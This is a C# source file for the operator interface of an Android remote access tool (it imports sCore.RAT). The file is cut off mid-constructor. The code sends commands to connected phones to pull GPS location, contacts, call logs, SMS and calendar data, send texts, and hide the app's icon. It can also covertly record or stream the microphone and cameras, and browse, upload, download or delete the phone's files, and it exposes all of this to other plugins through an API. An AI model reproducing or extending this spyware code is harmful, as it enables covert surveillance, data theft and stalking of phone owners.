using System;
using System.Collections.Generic;
using System.Drawing;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using sCore.RAT;
using System.Text;

namespace AndroidExtension
{
    /// <summary>
    /// Handle UI action and visually represent actions and data
    /// </summary>
    public partial class AndroidUI : Form
    {
        #region Variables

        /// <summary>
        /// Class1 Reference
        /// </summary>
        Class1 ctx;
        /// <summary>
        /// SmsView Form reference
        /// </summary>
        private SmsView smsDisplay;
        /// <summary>
        /// Image View Form Reference
        /// </summary>
        private ImageView img;
        /// <summary>
        /// The last user defined video stream send delay
        /// </summary>
        private int videoStreamDelay;
        /// <summary>
        /// The current directory of the file browser
        /// </summary>
        private string currentDir = "";
        private string apiToken = "";
        private List<CmdCallback> externalCallbacks = new List<CmdCallback>();
        private List<CallbackData> localCallbacks = new List<CallbackData>();
        private Dictionary<int, List<string>> permissions = new Dictionary<int, List<string>>();

        #endregion

        #region BridgeFunctions

        private bool GlobalPermissionChecker(int permID, string pluginToken)
        {
            if (permID > 10 || permID < 2) return false;
            Dictionary<int, string> messages = new Dictionary<int, string>
            {
                { 2, "GPS/Geolocation permission" },
                { 3, "Misc. system function permissions" },
                { 4, "Read/Write Contact Data permission" },
                { 5, "CallLog permission" },
                { 6, "Read/Send SMS Message(s) permission" },
                { 7, "Calendar Event Full Control permission" },
                { 8, "Microphone permission" },
                { 9, "Camera permission" },
                { 10, "File System Management permissions" }
            };

            if (!permissions.ContainsKey(permID)) permissions.Add(permID, new List<string>());
            if (permissions.TryGetValue(permID, out List<string> allowedTokens))
            {
                if (!allowedTokens.Contains(pluginToken))
                {
                    if (!sCore.Integration.Integrate.CheckPermission(sCore.Permissions.Display, pluginToken))
                    {
                        Console.WriteLine("Error, permission requesting failed, because android server doesn't have display permission");
                        return false;
                    }

                    DialogResult r = ServerSettings.ShowMessageBox("Another plugin wants access to " + messages[permID] + "\r\nDo you want to allow it?", 
                        "Permission Request", MessageBoxButtons.YesNo, MessageBoxIcon.Question, ctx.pluginToken);

                    if (r == DialogResult.Yes)
                    {
                        allowedTokens.Add(pluginToken);
                        permissions[permID] = allowedTokens;

                        return true;
                    }
                    else return false;
                }
                else return true;
            }
            else return false;
        }

        internal void UnloadAPI()
        {
            sCore.Utils.ExternalAPIs.RemoveAllFunctions(apiToken);
            sCore.Utils.ExternalAPIs.RemovePermissionCheckers(apiToken);
            permissions.Clear();
        }

        private void PublishAPI()
        {
            sCore.Utils.ExternalAPIs.LoadPermissionChecks(apiToken,
                new Predicate<string>((x) => { return true; }),
                new Predicate<string>((x) => { return sCore.Integration.Integrate.CheckPermission(sCore.Permissions.ServerControl, x); }),
                new Predicate<string>((x) => { return GlobalPermissionChecker(2, x); }),
                new Predicate<string>((x) => { return GlobalPermissionChecker(3, x); }),
                new Predicate<string>((x) => { return GlobalPermissionChecker(4, x); }),
                new Predicate<string>((x) => { return GlobalPermissionChecker(5, x); }),
                new Predicate<string>((x) => { return GlobalPermissionChecker(6, x); }),
                new Predicate<string>((x) => { return GlobalPermissionChecker(7, x); }),
                new Predicate<string>((x) => { return GlobalPermissionChecker(8, x); }),
                new Predicate<string>((x) => { return GlobalPermissionChecker(9, x); }),
                new Predicate<string>((x) => { return GlobalPermissionChecker(10, x); })
                );

            sCore.Utils.ExternalAPIs.LoadExternalAPIFunctions(apiToken, typeof(AndroidUI));
        }

        public struct BatteryData
        {
            public string level;
            public string isCharging;
            public string chargingMethod;
            public string temperature;
        }

        public struct Coordinates
        {
            public string latitude;
            public string longitude;
        }

        public struct CmdCallback
        {
            public Action<string> function;
            public bool oneTime;
            public string commandFilter;
        }

        public struct CallbackData
        {
            public object value;
            public ManualResetEvent mre;
            public string functionName;
        }

        public struct OpAndList
        {
            public Class1.FileOperation fileOperation;
            public List<Class1.FileData> fileList;
        }

        public void CommandReceived(string command)
        {
            List<CmdCallback> removeList = new List<CmdCallback>();
            lock (externalCallbacks)
            {
                foreach (CmdCallback cc in externalCallbacks)
                {
                    if (cc.commandFilter == "*" || command.StartsWith(cc.commandFilter))
                    {
                        if (cc.oneTime) removeList.Add(cc);
                        cc.function(command);
                    }
                }

                removeList.ForEach((x) => { externalCallbacks.Remove(x); });
                removeList.Clear();
            }
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.ListClients", PermissionCheckerID = 0)]
        public string[] ListTargets()
        {
            Func<string[]> function = new Func<string[]>(() =>
            {
                List<string> connectedClients = new List<string>();

                foreach (object i in comboBox1.Items)
                {
                    connectedClients.Add(i.ToString());
                }

                return connectedClients.ToArray();

            });

            if (InvokeRequired)
            {
                return (string[]) Invoke(function);
            }
            else return function();
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.ControlClient", PermissionCheckerID = 1)]
        public void SelectTarget(int targetID)
        {
            Action a = new Action(() => {
                if (comboBox1.Items.Count < targetID)
                {
                    comboBox1.SelectedIndex = targetID;
                }
            });

            if (InvokeRequired) Invoke(a);
            else a();
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.AddCommandReadCallback", PermissionCheckerID = 0)]
        public void RegisterForResult(Action<string> resultCallback, bool oneTime = true, string filter = "*")
        {
            CmdCallback cc = new CmdCallback() { function = resultCallback, oneTime = oneTime, commandFilter = filter };
            lock (externalCallbacks)
            {
                externalCallbacks.Add(cc);
            }
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.TestConnection", PermissionCheckerID = 0)]
        public Task<bool> TestConnection()
        {
            Task<bool> t = new Task<bool>(() => {

                CallbackData cd = new CallbackData() { mre = new ManualResetEvent(false), functionName="testConnection" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cd);
                }

                cd.mre.WaitOne();
                bool result = (bool)cd.value;
                return result;

            });

            CmdCallback extCallback = new CmdCallback() {commandFilter="test", oneTime = true, function = (x) => {

                HandleLocalCallbacks("testConnection", true);

            }};

            externalCallbacks.Add(extCallback);
            t.Start();
            ctx.SendCommand("test");
            return t;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.GetGPS", PermissionCheckerID = 2)]
        public Task<Coordinates> GetGpsData()
        {
            Task<Coordinates> t = new Task<Coordinates>(() => {

                CallbackData cd = new CallbackData() { mre = new ManualResetEvent(false), functionName="getGpsData" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cd);
                }

                cd.mre.WaitOne();
                Coordinates result = (Coordinates)cd.value;
                return result;

            });

            CmdCallback extCallback = new CmdCallback() { commandFilter="gps|", oneTime = true, function = (x) => {

                string[] parts = x.Split('|');
                Coordinates c = new Coordinates() { latitude = parts[1], longitude = parts[2] };
                HandleLocalCallbacks("getGpsData", c);

            }};

            externalCallbacks.Add(extCallback);
            t.Start();
            ctx.SendCommand("gps");
            return t;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.GetBatteryInfo", PermissionCheckerID = 3)]
        public Task<BatteryData> GetBatteryData()
        {
            Task<BatteryData> t = new Task<BatteryData>(() => {

                CallbackData cd = new CallbackData() { mre = new ManualResetEvent(false), functionName="getBatteryData" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cd);
                }

                cd.mre.WaitOne();
                BatteryData result = (BatteryData)cd.value;
                return result;

            });

            CmdCallback extCallback = new CmdCallback() { commandFilter="battery|", oneTime = true, function = (x) => {

                string[] data = x.Split('|');
                BatteryData bd = new BatteryData() { level = data[0], isCharging = data[1], chargingMethod = data[2], temperature = data[3] };
                HandleLocalCallbacks("getBatteryData", bd);

            }};

            externalCallbacks.Add(extCallback);
            t.Start();
            ctx.SendCommand("battery");
            return t;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.GetContacts", PermissionCheckerID = 4)]
        public Task<Dictionary<string, string>> GetContacts()
        {
            Task<Dictionary<string, string>> t = new Task<Dictionary<string, string>>(() => {
                CallbackData cData = new CallbackData() { mre = new ManualResetEvent(false), functionName = "getContacts" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cData); 
                }
                cData.mre.WaitOne();
                Dictionary<string, string> result = (Dictionary<string, string>)cData.value;
                return result;
            });

            t.Start();
            ctx.SendCommand("contacts");
            return t;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.GetContactDetails", PermissionCheckerID = 4)]
        public Task<Dictionary<string, string>> GetContactDetails(string contactID)
        {
            Task<Dictionary<string, string>> t = new Task<Dictionary<string, string>>(() => {

                CallbackData cd = new CallbackData() { mre = new ManualResetEvent(false), functionName="getContactData" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cd); 
                }
                cd.mre.WaitOne();
                Dictionary<string, string> dict = (Dictionary<string, string>)cd.value;
                return dict;

            });

            Func<bool> checkItem = new Func<bool>(() =>
            {

                foreach (ListViewItem lvi in listView1.Items)
                {
                    if (lvi.SubItems[0].Text == contactID) return true;
                }

                return false;
            });

            bool itemExists = false;

            if (InvokeRequired)
            {
                itemExists = (bool)Invoke(checkItem);
            }
            else itemExists = checkItem();

            if (!itemExists) return null;

            CmdCallback cc = new CmdCallback() {commandFilter="contact|", oneTime = true, function = (x) => {
                Dictionary<string, string> dict = new Dictionary<string, string>();
                String[] data = x.Split('|');
                dict.Add("phone_numbers", data[1]);
                dict.Add("email_addresses", data[2]);
                dict.Add("home_address", data[3]);
                dict.Add("notes", data[4]);

                HandleLocalCallbacks("getContactData", dict);
            }};

            externalCallbacks.Add(cc);
            t.Start();
            ctx.SendCommand("contact|" + contactID);
            return t;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.AddContact", PermissionCheckerID = 4)]
        public void AddContact(string name, string phoneNumber, string emailAddress, string address, string notes)
        {
            StringBuilder sb = new StringBuilder();
            sb.Append("addcontact").Append("|");
            sb.Append(name).Append("|");
            sb.Append(phoneNumber).Append("|");
            sb.Append(emailAddress).Append("|");
            sb.Append(address).Append("|");
            sb.Append(notes);
            ctx.SendCommand(sb.ToString());
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.GetCallLog", PermissionCheckerID = 5)]
        public Task<List<Class1.CallData>> GetCallLogs()
        {
            Task<List<Class1.CallData>> t = new Task<List<Class1.CallData>>(() => {

                CallbackData cd = new CallbackData() { mre = new ManualResetEvent(false), functionName="getCallLog" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cd); 
                }
                cd.mre.WaitOne();
                List<Class1.CallData> result = (List<Class1.CallData>)cd.value;
                return result;

            });

            t.Start();
            ctx.SendCommand("calllog");
            return t;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.GetSmsMessages", PermissionCheckerID = 6)]
        public Task<List<Class1.SmsData>> GetSmsMessages()
        {
            Task<List<Class1.SmsData>> t = new Task<List<Class1.SmsData>>(() => {

                CallbackData cd = new CallbackData() { mre = new ManualResetEvent(false), functionName="getSmsMessages" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cd); 
                }
                cd.mre.WaitOne();
                List<Class1.SmsData> result = (List<Class1.SmsData>)cd.value;
                return result;

            });

            t.Start();
            ctx.SendCommand("sms");
            return t;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.SendSmsMessage", PermissionCheckerID = 6)]
        public void SendSmsMessage(string phoneNumber, string message)
        {
            string command = "send-sms|" + phoneNumber + "|" + message.Replace("|", string.Empty);
            ctx.SendCommand(command);
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.HideApp", PermissionCheckerID = 3)]
        public void HideApplication()
        {
            ctx.SendCommand("self-hide");
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.ShowApp", PermissionCheckerID = 3)]
        public void ShowApplication()
        {
            ctx.SendCommand("self-show");
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.GetInstalledApps", PermissionCheckerID = 3)]
        public Task<string[]> GetInstalledApplications()
        {
            Task<string[]> t = new Task<string[]>(() => {

                CallbackData cd = new CallbackData() { mre = new ManualResetEvent(false), functionName="getInstalledApps" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cd);
                }
                cd.mre.WaitOne();
                string[] result = (string[])cd.value;
                return result;

            });

            CmdCallback extCallback = new CmdCallback() { commandFilter="apps|", oneTime=true, function = (x) => {

                x = x.Substring(5);
                HandleLocalCallbacks("getInstakkedApps", x.Split('|'));

            }};

            externalCallbacks.Add(extCallback);
            t.Start();
            ctx.SendCommand("apps");
            return t;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.GetCalendarEvents", PermissionCheckerID = 7)]
        public Task<List<Class1.EventData>> GetCalendarEvents()
        {
            Task<List<Class1.EventData>> t = new Task<List<Class1.EventData>>(() => {

                CallbackData cd = new CallbackData() { mre = new ManualResetEvent(false), functionName="getCalendarEvents" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cd); 
                }
                cd.mre.WaitOne();
                List<Class1.EventData> result = (List<Class1.EventData>)cd.value;
                return result;

            });

            t.Start();
            ctx.SendCommand("calendar");
            return t;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.AddCalendarEvent", PermissionCheckerID = 7)]
        public void AddCalendarEvent(string name, string description, string location, DateTime timeStart, DateTime timeEnd)
        {
            StringBuilder command = new StringBuilder();
            StringBuilder startTime = new StringBuilder();
            StringBuilder endTime = new StringBuilder();

            command.Append("add-calendar|");
            command.Append(name).Append("|");
            command.Append(description).Append("|");
            command.Append(location).Append("|");

            startTime.Append(timeStart.Year).Append(";")
                .Append(timeStart.Month).Append(";")
                .Append(timeStart.Day).Append(";")
                .Append(timeStart.Hour).Append(";")
                .Append(timeStart.Minute).Append(";");

            endTime.Append(timeEnd.Year).Append(";")
                .Append(timeEnd.Month).Append(";")
                .Append(timeEnd.Day).Append(";")
                .Append(timeEnd.Hour).Append(";")
                .Append(timeEnd.Minute).Append(";");

            command.Append(startTime.ToString()).Append("|");
            command.Append(endTime.ToString());

            ctx.SendCommand(command.ToString());
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.UpdateCalendarEvent", PermissionCheckerID = 7)]
        public void UpdateCalendarEvent(string eventID, string name, string description, string location, DateTime timeStart, DateTime timeEnd)
        {
            StringBuilder command = new StringBuilder();
            StringBuilder startTime = new StringBuilder();
            StringBuilder endTime = new StringBuilder();

            bool eventExists = false;
            Func<bool> checkEvent = new Func<bool>(() => {

                foreach (ListViewItem lvi in listView3.Items)
                {
                    if (lvi.SubItems[0].Text == eventID) return true;
                }

                return false;
            });

            if (InvokeRequired) eventExists = (bool)Invoke(checkEvent);
            else eventExists = checkEvent();

            if (!eventExists) return;

            command.Append("update-calendar|").Append(eventID).Append("|");
            command.Append(name).Append("|");
            command.Append(description).Append("|");
            command.Append(location).Append("|");

            startTime.Append(timeStart.Year).Append(";")
                .Append(timeStart.Month).Append(";")
                .Append(timeStart.Day).Append(";")
                .Append(timeStart.Hour).Append(";")
                .Append(timeStart.Minute).Append(";");

            endTime.Append(timeEnd.Year).Append(";")
                .Append(timeEnd.Month).Append(";")
                .Append(timeEnd.Day).Append(";")
                .Append(timeEnd.Hour).Append(";")
                .Append(timeEnd.Minute).Append(";");

            command.Append(startTime.ToString()).Append("|");
            command.Append(endTime.ToString());

            ctx.SendCommand(command.ToString());
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.DeleteCalendarEvent", PermissionCheckerID = 7)]
        public void DeleteCalendarEvent(string eventID)
        {
            bool eventExists = false;
            Func<bool> checkEvent = new Func<bool>(() => {

                foreach (ListViewItem lvi in listView3.Items)
                {
                    if (lvi.SubItems[0].Text == eventID) return true;
                }

                return false;
            });

            if (InvokeRequired) eventExists = (bool)Invoke(checkEvent);
            else eventExists = checkEvent();

            if (!eventExists) return;

            ctx.SendCommand("delete-calendar|" + eventID);
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.GetEventDetails", PermissionCheckerID = 7)]
        public Dictionary<string, string> GetEventDetails(string eventID)
        {
            bool eventExists = false;
            Class1.EventData edata = new Class1.EventData();
            Dictionary<string, string> dict = new Dictionary<string, string>();
            Func<bool> checkEvent = new Func<bool>(() => {

                foreach (ListViewItem lvi in listView3.Items)
                {
                    if (lvi.SubItems[0].Text == eventID)
                    {
                        edata = (Class1.EventData)lvi.Tag;
                        return true;
                    }
                }

                return false;
            });

            if (InvokeRequired) eventExists = (bool)Invoke(checkEvent);
            else eventExists = checkEvent();

            if (!eventExists) return dict;

            dict.Add("event_name", edata.name);
            dict.Add("event_description", edata.description);
            dict.Add("event_location", edata.location);
            dict.Add("event_time_start", edata.startTime);
            dict.Add("event_time_end", edata.endTime);

            return dict;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.IsRecordingAudio", PermissionCheckerID = 0)]
        public bool IsRecordingAudio()
        {
            Func<bool> a = new Func<bool>(() => {

                if (button11.Text.Contains("Start")) return false;
                else return true;

            });

            if (InvokeRequired) return (bool)Invoke(a);
            else return a();
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.ToggleAudioRecording", PermissionCheckerID = 8)]
        public void ToggleAudioRecording()
        {
            Action a = new Action(() => {

                if (button11.Enabled)
                {
                    button11_Click(button11, new EventArgs());
                }

            });

            if (InvokeRequired) Invoke(a);
            else a();
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.IsStreamingAudio", PermissionCheckerID = 0)]
        public bool IsTappingAudio()
        {
            Func<bool> a = new Func<bool>(() => {

                if (button12.Text.Contains("Start")) return false;
                else return true;

            });

            if (InvokeRequired) return (bool)Invoke(a);
            else return a();
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.ToggleAudioStreaming", PermissionCheckerID = 8)]
        public void ToggleAudioTapping()
        {
            Action a = new Action(() => {

                if (button12.Enabled)
                {
                    button12_Click(button12, new EventArgs());
                }

            });

            if (InvokeRequired) Invoke(a);
            else a();
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.TakePhoto", PermissionCheckerID = 9)]
        public Task<Image> TakePhoto(string camFacing)
        {
            camFacing = camFacing.ToLower();
            if (camFacing != "back" && camFacing != "front") return null;

            Task<Image> t = new Task<Image>(() => {

                CallbackData cd = new CallbackData() { mre = new ManualResetEvent(false), functionName="takePhoto" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cd); 
                }
                cd.mre.WaitOne();
                Image result = (Image)cd.value;
                return result;

            });

            ctx.expectPhoto = true;
            t.Start();
            ctx.SendCommand("cam-photo|" + camFacing);
            return t;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.IsRecordingCam", PermissionCheckerID = 0)]
        public bool IsRecordingCam()
        {
            Func<bool> a = new Func<bool>(() => {

                if (button14.Text.Contains("Start")) return false;
                else return true;

            });

            if (InvokeRequired) return (bool)Invoke(a);
            else return a();
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.ToggleCamRecording", PermissionCheckerID = 9)]
        public void ToggleRecordingCam(string camFacing = "")
        {
            camFacing = camFacing.ToLower();
            bool canLeave = false;
            if (camFacing != "back" && camFacing != "front") canLeave = true;

            Action a = new Action(() => {
                if (button14.Text.StartsWith("Start")) //Not recording
                {
                    if (canLeave) return;
                    //Get cam facing
                    button13.Enabled = false; //Prevent photo
                    button15.Enabled = false; //Prevent video stream
                    ctx.SendCommand("cam-record-start|" + camFacing); //Send command
                    button14.Text = "Stop Recording Cam"; //Change state
                    return;
                }

                if (button14.Text.StartsWith("Stop")) //Recording
                {
                    ctx.SendCommand("cam-record-stop"); //Send Command
                    button13.Enabled = true; //Allow photo
                    button15.Enabled = true; //Allow Video Stream
                    button14.Text = "Start Recording Cam"; //Change State
                }
            });

            if (InvokeRequired) Invoke(a);
            else a();
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.IsStreamingCam", PermissionCheckerID = 0)]
        public bool IsTappingCam()
        {
            Func<bool> a = new Func<bool>(() => {

                if (button15.Text.Contains("Start")) return false;
                else return true;

            });

            if (InvokeRequired) return (bool)Invoke(a);
            else return a();
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.ToggleCamStreaming", PermissionCheckerID = 9)]
        public void ToggleTappingCam(string camFacing = "", string quality = "", string delay = "")
        {
            bool canLeave = true;
            if (!float.TryParse(delay, out float test) && !int.TryParse(delay, out int test2)) canLeave = true;
            bool validInput = int.TryParse(quality, out int result);
            if (!validInput || result < 0 || result > 100) canLeave = true;
            camFacing = camFacing.ToLower();
            if (camFacing != "back" && camFacing != "front") canLeave = true;

            Action a = new Action(() => {

                if (button15.Text.StartsWith("Start")) //Not Streaming
                {
                    if (canLeave) return;
                    ctx.expectVideo = true; //Context expect video frames
                    button13.Enabled = false; //Prevent photo
                    button14.Enabled = false; //Prevent video recording
                    if (img != null) img.Close(); //If imageView open then close it
                    img = new ImageView(true); //Stream Mode = true (auto rotate new images)
                    img.Show(); //Display imageView
                    ctx.SendCommand("cam-tap-start|" + camFacing + "|" + quality + "|" + delay); //Send command
                    button15.Text = "Stop Tapping Cam"; //Change State
                    return;
                }

                if (button15.Text.StartsWith("Stop")) //Streaming
                {
                    ctx.SendCommand("cam-tap-stop"); //Send Command
                    Thread t = new Thread(new ThreadStart(ResetExpectVideo)); //Create context expectation reset thread
                    t.Start(); //Start that thread
                    if (img != null) img.Close(); //close imageView
                    img.Dispose(); //Dispose imageView
                    img = null; //set imageView to null
                    button13.Enabled = true; //Allow taking photo
                    button14.Enabled = true; //Allow recording video
                    button15.Text = "Start Tapping Cam"; //Change State
                }

            });

            if (InvokeRequired) Invoke(a);
            else a();
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.GetCamStreamFrame", PermissionCheckerID = 9)]
        public Task<Image> GetNextFrame()
        {
            if (!IsTappingCam()) return null;

            Task<Image> t = new Task<Image>(() => {

                CallbackData cd = new CallbackData() { mre = new ManualResetEvent(false), functionName="getNextFrame" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cd); 
                }
                cd.mre.WaitOne();
                Image result = (Image)cd.value;
                return result;

            });

            t.Start();
            return t;
        }

        private bool FileExists(string file)
        {
            Func<bool> checkFile = new Func<bool>(() => {

                foreach (ListViewItem lvi in listView4.Items)
                {
                    if (lvi.SubItems[2].Text == file) return true;
                }

                return false;

            });

            bool fileExists = false;

            if (InvokeRequired) fileExists = (bool)Invoke(checkFile);
            else fileExists = checkFile();

            return fileExists;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.ListRoot", PermissionCheckerID = 10)]
        public Task<OpAndList> ListFiles()
        {
            Task<OpAndList> t = new Task<OpAndList>(() => {

                CallbackData cd = new CallbackData() { mre = new ManualResetEvent(false), functionName="listFiles" };
                CallbackData cd2 = new CallbackData() { mre = new ManualResetEvent(false), functionName = "getFopResult" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cd);
                    localCallbacks.Add(cd2);
                }
                cd2.mre.WaitOne();
                Class1.FileOperation fResult = (Class1.FileOperation)cd2.value;
                if (!fResult.success)
                {
                    return new OpAndList() { fileOperation = fResult };
                }
                cd.mre.WaitOne();
                List<Class1.FileData> result = (List<Class1.FileData>)cd.value;
                return new OpAndList() { fileList = result, fileOperation = fResult };

            });

            t.Start();
            currentDir = "/";
            ctx.SendCommand("flist");
            return t;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.ListDirectory", PermissionCheckerID = 10)]
        public Task<OpAndList> EnterDirectory(string directory)
        {
            if (!FileExists(directory)) return null;

            Task<OpAndList> t = new Task<OpAndList>(() => {

                CallbackData cd = new CallbackData() { mre = new ManualResetEvent(false), functionName = "listFiles" };
                CallbackData cd2 = new CallbackData() { mre = new ManualResetEvent(false), functionName = "getFopResult" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cd);
                    localCallbacks.Add(cd2);
                }
                cd2.mre.WaitOne();
                Class1.FileOperation fResult = (Class1.FileOperation)cd2.value;
                if (!fResult.success)
                {
                    return new OpAndList() { fileOperation = fResult };
                }
                cd.mre.WaitOne();
                List<Class1.FileData> result = (List<Class1.FileData>)cd.value;
                return new OpAndList() { fileList = result, fileOperation = fResult };

            });

            t.Start();
            currentDir = directory;
            ctx.SendCommand("flist|" + directory);
            return t;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.MoveFile", PermissionCheckerID = 10)]
        public void MoveFile(string file)
        {
            if (!FileExists(file)) return;

            ctx.SendCommand("fmove|" + file);
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.CopyFile", PermissionCheckerID = 10)]
        public void CopyFile(string file)
        {
            if (!FileExists(file)) return;

            ctx.SendCommand("fcopy|" + file);
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.PasteFile", PermissionCheckerID = 10)]
        public Task<Class1.FileOperation> PasteFile()
        {
            Task<Class1.FileOperation> t = new Task<Class1.FileOperation>(() => {

                CallbackData cd = new CallbackData() { mre = new ManualResetEvent(false), functionName="getFopResult" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cd);
                }
                cd.mre.WaitOne();
                Class1.FileOperation result = (Class1.FileOperation)cd.value;
                return result;

            });

            t.Start();
            ctx.SendCommand("fpaste|" + currentDir);
            return t;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.DeleteFile", PermissionCheckerID = 10)]
        public Task<Class1.FileOperation> DeleteFile(string file)
        {
            if (!FileExists(file)) return null;

            Task<Class1.FileOperation> t = new Task<Class1.FileOperation>(() => {

                CallbackData cd = new CallbackData() { mre = new ManualResetEvent(false), functionName = "getFopResult" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cd);
                }
                cd.mre.WaitOne();
                Class1.FileOperation result = (Class1.FileOperation)cd.value;
                return result;

            });

            t.Start();
            ctx.SendCommand("fdel|" + file);
            return t;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.RenameFile", PermissionCheckerID = 10)]
        public Task<Class1.FileOperation> RenameFile(string file, string newName)
        {
            if (!FileExists(file)) return null;

            Task<Class1.FileOperation> t = new Task<Class1.FileOperation>(() => {

                CallbackData cd = new CallbackData() { mre = new ManualResetEvent(false), functionName = "getFopResult" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cd);
                }
                cd.mre.WaitOne();
                Class1.FileOperation result = (Class1.FileOperation)cd.value;
                return result;

            });

            t.Start();
            ctx.SendCommand("frename|" + file + "|" + newName);
            return t;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.DownloadFile", PermissionCheckerID = 10)]
        public Task<Class1.FileOperation> DownloadFile(string file, string localSavePath)
        {
            if (!FileExists(file)) return null;

            Task<Class1.FileOperation> t = new Task<Class1.FileOperation>(() => {

                CallbackData cd = new CallbackData() { mre = new ManualResetEvent(false), functionName = "getFopResult" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cd);
                }
                cd.mre.WaitOne();
                Class1.FileOperation result = (Class1.FileOperation)cd.value;
                return result;

            });

            t.Start();
            ctx.dlFilePath = localSavePath;
            ctx.SendCommand("fdownload|" + file);
            return t;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.UploadFile", PermissionCheckerID = 10)]
        public Task<Class1.FileOperation> UploadFile(string localFilePath)
        {
            if (!System.IO.File.Exists(localFilePath)) return null;
            Task<Class1.FileOperation> t = new Task<Class1.FileOperation>(() => {

                CallbackData cd = new CallbackData() { mre = new ManualResetEvent(false), functionName = "getFopResult" };
                lock (localCallbacks)
                {
                    localCallbacks.Add(cd);
                }
                cd.mre.WaitOne();
                Class1.FileOperation result = (Class1.FileOperation)cd.value;
                return result;

            });

            t.Start();
            long length = new System.IO.FileInfo(localFilePath).Length; //Get file size in bytes
            ctx.ulFilePath = localFilePath; //Set context upload file path
            ctx.SendCommand("fupload|" + currentDir + "/" + new System.IO.FileInfo(localFilePath).Name + "|" + length); //Send command
            return t;
        }

        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "Android.Up1Directory", PermissionCheckerID = 10)]
        public Task<OpAndList> Up1Directory()
        {
            if (currentDir.IndexOf('/') == currentDir.LastIndexOf('/')) return ListFiles(); //up1 is root -> /
            else if (currentDir == "/") return null; //up1 is nothing because we are on the top
            else //need to calcualte up1
            {
                currentDir = currentDir.Substring(0, currentDir.LastIndexOf('/')); //Set the new current dir, calculate the parent directory
                return EnterDirectory(currentDir);
            }
        }

        public void HandleLocalCallbacks(string functionName, object value)
        {
            lock (localCallbacks)
            {
                localCallbacks.ForEach((x) =>
                {

                    if (x.functionName == functionName)
                    {
                        x.value = value;
                        x.mre.Set();
                    }

                }); 
            }
        }

        #endregion

        #region UI Functions

        public AndroidUI()
        {
            InitializeComponent();
        }

        /// <summary>
        /// AndroidUI Constructor
        /// </summary>
        /// <param name="ratCom">A Class1 reference</param>
        public AndroidUI(Class1 ratCom)
        {
            InitializeComponent(); //Display controls
            try
            {
                apiToken = sCore.Utils.ExternalAPIs.CreateOwnerKey();
                PublishAPI();
                ctx = ratCom; //Set class1 reference
                //Attach to events
                ctx.ClientJoined += new Action<string>(OnNewClient);
                ctx.ClientDisconnected += new Action<string>(OnClientDisconnected);
                ctx.ContactsListReveived += new Action<Dictionary<string, string>>(OnContactsList);
                ctx.CallLogReceived += new Action<List<Class1.CallData>>(OnCallLogList);
                ctx.SmsDataReceived += new Action<List<Class1.SmsData>>(OnSmsList);
                ctx.CalendarDataReceived += new Action<List<Class1.EventData>>(OnEventList);
                ctx.PhotoReceived += new Action<byte[]>(OnPhoto);
